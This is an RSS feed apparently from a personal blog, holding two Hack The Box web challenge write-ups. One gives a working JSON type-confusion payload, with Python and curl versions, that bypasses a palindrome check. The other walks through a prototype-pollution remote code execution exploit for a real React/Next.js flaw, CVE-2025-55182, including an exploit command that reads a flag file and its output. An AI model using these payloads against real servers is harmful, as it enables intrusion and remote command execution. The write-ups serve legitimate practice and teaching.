<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>HTB on The D3bug Blog</title><link>https://nick-graves.github.io/categories/htb/</link><description>Recent content in HTB on The D3bug Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 29 Jan 2026 09:26:13 -0800</lastBuildDate><atom:link href="https://nick-graves.github.io/categories/htb/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB: Magical Palindrome</title><link>https://nick-graves.github.io/post/magicalpalindrome/</link><pubDate>Thu, 29 Jan 2026 09:26:13 -0800</pubDate><guid>https://nick-graves.github.io/post/magicalpalindrome/</guid><description>&lt;img src="https://nick-graves.github.io/post/images/MagicalPalindrome.jpg" alt="Featured image of post HTB: Magical Palindrome" /&gt;&lt;h1 id="htb-magical-palindrome"&gt;HTB: Magical Palindrome
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Difficulty: Easy&lt;/li&gt;
&lt;li&gt;Category: Web&lt;/li&gt;
&lt;li&gt;Solved: 1/29/2026&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="challenge-description"&gt;Challenge Description
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;In Dumbledore&amp;rsquo;s absence, Harry&amp;rsquo;s memory fades, leaving crucial words lost. Delve into the arcane world, harness the power of JSON, and unveil the hidden spell to restore his recollection. Can you help harry yo find path to salvation?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src="https://nick-graves.github.io/post/images/palindrom_web.jpg"
loading="lazy"
alt="Alt text"
&gt;&lt;/p&gt;
&lt;h2 id="recon"&gt;Recon
&lt;/h2&gt;&lt;p&gt;The page has an input form. So the first thing I did was just play around with random inputs. It seemed like no matter what you input (even if it was a valid palindrome) you would get the message &amp;ldquo;Tootus Shortus&amp;rdquo;. This made sense after looking at the code. The backend was incredibly simple. One endpoint at &amp;ldquo;/&amp;rdquo; that took the user&amp;rsquo;s input and called a &lt;code&gt;IsPalinDrome&lt;/code&gt; function. Although, this function is a little different from a traditional palindrome check function (someone needs to brush up on two pointer). The algorithm is as follows:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;string&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;length&lt;/span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;Tootus Shortus&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the input&amp;rsquo;s length is less than 1000 characters, return &amp;ldquo;Tootus Shortus&amp;rdquo;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;const&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;i&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;of&lt;/span&gt; Array(&lt;span style="color:#a6e22e"&gt;string&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;length&lt;/span&gt;).&lt;span style="color:#a6e22e"&gt;keys&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then loop over a newly created array that is the same length as the input string. It then iterates over this new, blank array. The key here is we are not actually iterating over the input but rather something that has the same length as the input.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;const&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;original&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;string&lt;/span&gt;[&lt;span style="color:#a6e22e"&gt;i&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;const&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;reverse&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;string&lt;/span&gt;[&lt;span style="color:#a6e22e"&gt;string&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;length&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;i&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We then set some variables as the current &lt;code&gt;index&lt;/code&gt; and the &lt;code&gt;final index - the current index&lt;/code&gt; (traditional palindrome logic).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;original&lt;/span&gt; &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;reverse&lt;/span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;typeof&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;original&lt;/span&gt; &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;string&amp;#39;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;Notter Palindromer!!&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally we check the two variables that we set (&lt;code&gt;original&lt;/code&gt; and &lt;code&gt;reverse&lt;/code&gt;) to see if they are equal OR if the thing at &lt;code&gt;string[i]&lt;/code&gt; is a string. The return &amp;ldquo;Notter Palindromer!!&amp;rdquo; will trigger if EITHER the &lt;code&gt;original&lt;/code&gt; and &lt;code&gt;reverse&lt;/code&gt; variables don&amp;rsquo;t match OR &lt;code&gt;original&lt;/code&gt; is not a string.&lt;/p&gt;
&lt;p&gt;Back to the &amp;ldquo;/&amp;rdquo; endpoint, the output of the &lt;code&gt;IsPalinDrome&lt;/code&gt; function is assigned to a variable &lt;code&gt;error&lt;/code&gt;. If &lt;code&gt;error&lt;/code&gt; has a value then the endpoint return status code 400 and &lt;code&gt;error&lt;/code&gt;&amp;rsquo;s value. If, however, we can survive all of this logic and keep &lt;code&gt;error&lt;/code&gt; null we get the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;c&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;text&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;`Hii Harry!!! &lt;/span&gt;&lt;span style="color:#e6db74"&gt;${&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;flag&lt;/span&gt;&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So that whats we need to do. We just construct an input that survives all of this logic and the flag will be returned to us.&lt;/p&gt;
&lt;p&gt;This seems too easy though. We just need a valid palindrome, that is a string and is longer than 1000 characters.&lt;/p&gt;
&lt;p&gt;Of course this didn&amp;rsquo;t work though.
&lt;img src="https://nick-graves.github.io/post/images/palindrome_error.jpg"
loading="lazy"
alt="Alt text"
&gt;&lt;/p&gt;
&lt;p&gt;This is a &lt;a class="link" href="https://en.wikipedia.org/wiki/Nginx" target="_blank" rel="noopener"
&gt;Nginx&lt;/a&gt; error messages. So out valid solution was never actually reaching the app because Nginx shut it down because it was too large. Looking back at the code, the Nginx config files confirms this:&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;client_max_body_size 75;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So Nginx is only allowing requests that are 75 bytes or less. Since each ASCII character is one byte, the maximum possible input would be 75 characters in the &lt;em&gt;best case&lt;/em&gt;. In practice, the usable input is even smaller because the request body also includes additional bytes for formatting all of which count toward the 75-byte limit.&lt;/p&gt;
&lt;p&gt;So that is our problem. We need an input that can 1. pass all of the logic inside the &lt;code&gt;IsPalinDrome&lt;/code&gt; function while also 2. staying under the 75 byte limit of Nginx.&lt;/p&gt;
&lt;h2 id="exploitation"&gt;Exploitation
&lt;/h2&gt;&lt;p&gt;The app assumes we are going to input a string but &lt;em&gt;never actually&lt;/em&gt; checks. It just checks the &lt;code&gt;length&lt;/code&gt; of out input and then compares the values at opposite sides of the input.&lt;/p&gt;
&lt;p&gt;So this app really needs 2 things from us:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Some length value&lt;/li&gt;
&lt;li&gt;Matching characters at opposite ends of the input&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;What if we input some json object and just specified the length? If the object we input had some preset value &lt;code&gt;length&lt;/code&gt;, when the backend calls &lt;code&gt;string.length&lt;/code&gt; it wouldn&amp;rsquo;t calculate the actual length of the object it would just reference the value associated with the key &lt;code&gt;length&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;That gets us through the first checkpoint of the backend logic, but we still need to get through the second if statement. For that, the values of out input at index &lt;code&gt;i&lt;/code&gt; and &lt;code&gt;length - 1 - i&lt;/code&gt; need to be the same and they need to be strings. This is where we need to get creative. If in the previous &lt;code&gt;length&lt;/code&gt; definition, we set it to be a string, when the backend runs &lt;code&gt;Array(string.length).keys()&lt;/code&gt; it evaluates &lt;code&gt;Array(&amp;quot;1001&amp;quot;).keys()&lt;/code&gt; which produces &lt;code&gt;0&lt;/code&gt; (since it is only 1 string it will be indexed to 0). So the for loop only runs 1 time. It only compares the &lt;code&gt;0&lt;/code&gt; index to the &lt;code&gt;length - 1 - 0&lt;/code&gt; index. When JavaScript tires to evaluates &lt;code&gt;length - 1 - 0&lt;/code&gt; it will convert length to a int to preform the calculation. Knowing that, we can specify the &lt;code&gt;0&lt;/code&gt; index and the &lt;code&gt;length - 1 - 0&lt;/code&gt; index in the json input the same way we did for the &lt;code&gt;length&lt;/code&gt;. All together it looks something like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {&lt;span style="color:#e6db74"&gt;&amp;#34;palindrome&amp;#34;&lt;/span&gt;:{&lt;span style="color:#e6db74"&gt;&amp;#34;length&amp;#34;&lt;/span&gt;:&lt;span style="color:#e6db74"&gt;&amp;#34;1001&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;0&amp;#34;&lt;/span&gt;:&lt;span style="color:#e6db74"&gt;&amp;#34;a&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;1000&amp;#34;&lt;/span&gt;:&lt;span style="color:#e6db74"&gt;&amp;#34;a&amp;#34;&lt;/span&gt;}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On the server&amp;rsquo;s side it will see something like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;length&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;1001&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;a&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;1000&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;:&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;a&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Walking through the backend code, it will first check if the &lt;code&gt;length&lt;/code&gt; value is less than 1000. Our value &lt;code&gt;length&lt;/code&gt; would be accessed and converted to a int (thank you terrible typing in JavaScript) and since 1001 &amp;gt; 1000 we would avoid the return.&lt;/p&gt;
&lt;p&gt;Going onto the for loop, &lt;code&gt;Array(string.length).keys()&lt;/code&gt; would create an empty array of length 1 and get the index which is just 0.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;original&lt;/code&gt; and &lt;code&gt;reverse&lt;/code&gt; variables would be set to &lt;code&gt;string[i]&lt;/code&gt; and &lt;code&gt;string[string.length - i - 1]&lt;/code&gt; which in our case would be &lt;code&gt;string[0]&lt;/code&gt; = &amp;ldquo;a&amp;rdquo; and &lt;code&gt;string[string.1001 - 0 - 1]&lt;/code&gt; = &amp;ldquo;a&amp;rdquo;. They are equal and both strings so we would exit out of the &lt;code&gt;IsPalinDrome&lt;/code&gt; function and get our flag.&lt;/p&gt;
&lt;p&gt;The final script I used can be seen here:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;http://IP:PORT/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {&lt;span style="color:#e6db74"&gt;&amp;#34;palindrome&amp;#34;&lt;/span&gt;:{&lt;span style="color:#e6db74"&gt;&amp;#34;length&amp;#34;&lt;/span&gt;:&lt;span style="color:#e6db74"&gt;&amp;#34;1001&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;0&amp;#34;&lt;/span&gt;:&lt;span style="color:#e6db74"&gt;&amp;#34;a&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;1000&amp;#34;&lt;/span&gt;:&lt;span style="color:#e6db74"&gt;&amp;#34;a&amp;#34;&lt;/span&gt;}}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;response &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;post(url, json&lt;span style="color:#f92672"&gt;=&lt;/span&gt;payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;Status: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;response&lt;span style="color:#f92672"&gt;.&lt;/span&gt;status_code&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;print(&lt;span style="color:#e6db74"&gt;f&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;Response: &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;response&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You could do the same thing through a CURL command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -X POST http://IP:PORT/ &lt;span style="color:#ae81ff"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-H &lt;span style="color:#e6db74"&gt;&amp;#34;Content-Type: application/json&amp;#34;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-d &lt;span style="color:#e6db74"&gt;&amp;#39;{&amp;#34;palindrome&amp;#34;: {&amp;#34;length&amp;#34;: &amp;#34;1001&amp;#34;, &amp;#34;0&amp;#34;: &amp;#34;a&amp;#34;, &amp;#34;1000&amp;#34;: &amp;#34;a&amp;#34;}}&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="takeaways"&gt;Takeaways
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;I understand why TypeScript exists.&lt;/li&gt;
&lt;/ol&gt;</description></item><item><title>HTB: ReactOOPS</title><link>https://nick-graves.github.io/post/reactoops/</link><pubDate>Mon, 26 Jan 2026 19:50:27 -0800</pubDate><guid>https://nick-graves.github.io/post/reactoops/</guid><description>&lt;img src="https://nick-graves.github.io/post/images/ReactOOPS.jpg" alt="Featured image of post HTB: ReactOOPS" /&gt;&lt;h1 id="htb-reactoops"&gt;HTB: ReactOOPS
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Difficulty: Very Easy&lt;/li&gt;
&lt;li&gt;Category: Web&lt;/li&gt;
&lt;li&gt;Solved: 1/26/2026&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="challenge-description"&gt;Challenge Description
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;NexusAI&amp;rsquo;s polished assistant interface promises adaptive learning and seamless interaction. But beneath its reactive front end, subtle glitches hint that user input may be shaping the system in unexpected ways. Explore the platform, trace the echoes in its reactive layer, and uncover the hidden flaw buried behind the UI.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src="https://nick-graves.github.io/post/images/ReactOOPS_webpage.png"
loading="lazy"
alt="Alt text"
&gt;&lt;/p&gt;
&lt;h2 id="recon"&gt;Recon
&lt;/h2&gt;&lt;p&gt;I started by digging around the codebase which led to a few key findings:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;package.json&lt;/code&gt; - Revealed the package name &lt;code&gt;react2shell&lt;/code&gt; along with the frameworks versions
&lt;ul&gt;
&lt;li&gt;Next.js &lt;code&gt;16.0.6&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;React &lt;code&gt;^19&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;Dockerfile&lt;/code&gt; showed a flag located at &lt;code&gt;/app/flag.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since the challenge description hinted at user input but there were no input forms on the page this seemed to indicate that the vulnerability was in the framework no the application code.&lt;/p&gt;
&lt;h2 id="vulnerability-identification"&gt;Vulnerability Identification
&lt;/h2&gt;&lt;p&gt;A quick google search of &amp;ldquo;react2shell&amp;rdquo; (just using my resources not cheating &amp;hellip; right?) pointed towards a a known vulnerability &lt;a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2025-55182" target="_blank" rel="noopener"
&gt;CVE-2025-55182&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="how-the-vulnerability-works"&gt;How the Vulnerability Works
&lt;/h2&gt;&lt;p&gt;The vulnerability exists in React&amp;rsquo;s Flight protocol deserializer, specifically in the &lt;code&gt;getOutlinedModel()&lt;/code&gt; function in &lt;code&gt;ReactFlightReplyServer.js&lt;/code&gt;. A missing &lt;code&gt;hasOwnProperty&lt;/code&gt; check during property traversal allows prototype chain pollution.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// Vulnerable code
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;let&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;i&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; &lt;span style="color:#a6e22e"&gt;i&lt;/span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;path&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;length&lt;/span&gt;; &lt;span style="color:#a6e22e"&gt;i&lt;/span&gt;&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;value&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;[&lt;span style="color:#a6e22e"&gt;path&lt;/span&gt;[&lt;span style="color:#a6e22e"&gt;i&lt;/span&gt;]]; &lt;span style="color:#75715e"&gt;// No hasOwnProperty check!
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The attack chain then looks something like this:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Send a reference like &lt;code&gt;$1:__proto__:then&lt;/code&gt; in a POST request&lt;/li&gt;
&lt;li&gt;This traverses the prototype chain to reach &lt;code&gt;Chunk.prototype.then&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;React interprets the object as a Promise (due to the &lt;code&gt;.then&lt;/code&gt; property)&lt;/li&gt;
&lt;li&gt;When React awaits the &amp;ldquo;Promise&amp;rdquo;, it executes attacker-controlled code&lt;/li&gt;
&lt;li&gt;The code runs in Node.js context with server privileges&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="exploitation"&gt;Exploitation
&lt;/h2&gt;&lt;p&gt;I used an exploit script that I found on &lt;a class="link" href="https://github.com/freeqaz/react2shell/tree/master" target="_blank" rel="noopener"
&gt;github&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;./exploit-redirect.sh http://&amp;lt;TARGET&amp;gt;:&amp;lt;PORT&amp;gt;/ &lt;span style="color:#e6db74"&gt;&amp;#34;cat /app/flag.txt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To get this result&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;[&lt;/span&gt;+&lt;span style="color:#f92672"&gt;]&lt;/span&gt; HTTP &lt;span style="color:#ae81ff"&gt;303&lt;/span&gt; - Redirect exfil successful
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;[&lt;/span&gt;+&lt;span style="color:#f92672"&gt;]&lt;/span&gt; Command output:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;----------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;HTB&lt;span style="color:#f92672"&gt;{&lt;/span&gt;&amp;lt;flag&amp;gt;&lt;span style="color:#f92672"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;----------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="takeaways"&gt;Takeaways
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;You are only as strong as your weakest framework. In this example the application code was sound but an exploit in the framework left is vulnerable.&lt;/li&gt;
&lt;li&gt;Sometimes the answer is in the package.json! It would never be this easy in the real world but for these little puzzles combing through the files can hold all kinds of little (or big) hints.&lt;/li&gt;
&lt;li&gt;The initial exploit triggered RCE but didn&amp;rsquo;t return output. Using Next.js&amp;rsquo;s redirect mechanism allowed us to capture command output via response headers.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="references"&gt;References
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2025-55182" target="_blank" rel="noopener"
&gt;https://nvd.nist.gov/vuln/detail/CVE-2025-55182&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://www.trendmicro.com/en_us/research/25/l/CVE-2025-55182-analysis-poc-itw.html" target="_blank" rel="noopener"
&gt;https://www.trendmicro.com/en_us/research/25/l/CVE-2025-55182-analysis-poc-itw.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182" target="_blank" rel="noopener"
&gt;https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" target="_blank" rel="noopener"
&gt;https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description></item></channel></rss>